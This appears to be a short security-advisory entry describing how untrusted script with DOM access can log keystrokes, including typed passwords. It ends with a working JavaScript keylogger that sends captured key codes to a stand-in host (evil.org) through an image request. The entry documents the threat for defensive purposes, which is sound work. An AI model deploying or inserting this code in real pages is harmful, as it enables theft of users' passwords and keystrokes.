# DOM access allows keylogging #

## Effect ##
If the implementation can phone home, it can log keystrokes and send them home.
If the embedding page contains a password field, it could log the password as typ
ed even if it can't access the password's value.



## Background ##
Any DOM element is reachable from any other, and the onkeypress handler on docume
nt.body will receive all keystrokes in the current frame.  It does not receive ke
ystrokes cross frame -- not even from iframes.



## Assumptions ##
Untrusted code can access a DOM element that is a parent of a password field, and
> can add an onkeypress or onkeydown or onkeyup event handler.

Untrusted code can cause the browser to request a URL that it controls, or store
the data for retrieval by other means.



## Versions ##
All



## Example ##
```
Date.now = Date.now || function () { return (new Date).getTime(); };
var log = [];
var lastSend = Date.now();
document.body.onkeypress = function (event) {
  log.push(event.which || event.keyCode);
  if (Date.now() - lastSend > 1000) {
    (new Image()).src = 'http://evil.org?keys_logged=' + log.join();
    log = [];
    lastSend = Date.now();
  }
};
```